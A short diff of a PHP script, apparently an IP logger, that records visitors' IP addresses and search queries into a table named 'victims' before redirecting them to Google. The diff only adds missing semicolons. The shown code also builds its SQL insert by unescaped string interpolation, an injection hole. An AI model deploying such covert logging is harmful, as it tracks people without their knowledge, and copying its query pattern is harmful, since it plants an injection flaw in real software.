@@ -16,13 +16,13 @@
 
             $conn = mysqli_connect($server, $username, $password, $database);
 
-            $ip = $_SERVER['REMOTE_ADDR'] 
+            $ip = $_SERVER['REMOTE_ADDR']; 
             $q = htmlspecialchars($_GET['query']);
 
         
             $sql = "INSERT INTO victims (ip, q) VALUES ('{$ip}', {$q});";
 
-            $url= "https://www.google.com/search?q=" . $q
+            $url= "https://www.google.com/search?q=" . $q;
             header("Location: $url"); 
 
         ?>
